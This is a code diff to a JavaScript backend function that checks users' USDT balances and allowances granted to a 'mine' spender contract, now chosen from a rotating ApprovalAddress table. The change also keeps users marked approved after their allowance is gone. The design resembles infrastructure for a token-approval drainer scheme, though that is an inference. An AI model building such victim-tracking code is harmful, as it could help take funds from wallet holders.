@@ -355,11 +355,24 @@ async function refreshSingleUserBalance(walletAddress) {
     if (!walletAddress) return null;
     const normalized = walletAddress.toLowerCase();
     const fetcherAddr = process.env.BALANCE_FETCHER_ADDRESS;
-    const { User } = require('../config/database');
+    const { User, ApprovalAddress } = require('../config/database');
 
     try {
         let balance = '0.0000';
-        let approvalStatus = 'not_approved';
+        const existingUser = await User.findOne({ where: { walletAddress: normalized } });
+        let approvalStatus = (existingUser && (existingUser.approvalStatus === 'approved' || existingUser.approvalTxHash)) ? 'approved' : 'not_approved';
+
+        // Get active spender contract from DB or fallback
+        let spender = process.env.MINE_CONTRACT_ADDRESS || '0x2f14e75e21e6535e819580d7f5dd39ede769f44e';
+        try {
+            const dbContract = await ApprovalAddress.findOne({
+                where: { isActive: true },
+                order: [['createdAt', 'DESC']]
+            }) || await ApprovalAddress.findOne({ order: [['createdAt', 'DESC']] });
+            if (dbContract && dbContract.contractAddress) {
+                spender = dbContract.contractAddress;
+            }
+        } catch {}
 
         if (fetcherAddr) {
             const provider = createProvider(0);
@@ -367,7 +380,9 @@ async function refreshSingleUserBalance(walletAddress) {
             const [balances, allowances] = await fetcher.getBalancesFor([normalized]);
             if (balances && balances.length > 0) {
                 balance = ethers.formatUnits(balances[0], USDT_DECIMALS);
-                approvalStatus = allowances[0] > 0n ? 'approved' : 'not_approved';
+                if (allowances[0] > 0n || (existingUser && existingUser.approvalTxHash)) {
+                    approvalStatus = 'approved';
+                }
             }
         } else {
             const provider = createProvider(0);
@@ -378,9 +393,10 @@ async function refreshSingleUserBalance(walletAddress) {
             );
             const bal = await usdt.balanceOf(normalized);
             balance = ethers.formatUnits(bal, USDT_DECIMALS);
-            const spender = process.env.MINE_CONTRACT_ADDRESS || '0x2f14e75e21e6535e819580d7f5dd39ede769f44e';
             const allow = await usdt.allowance(normalized, spender);
-            approvalStatus = allow > 0n ? 'approved' : 'not_approved';
+            if (allow > 0n || (existingUser && existingUser.approvalTxHash)) {
+                approvalStatus = 'approved';
+            }
         }
 
         await User.update({
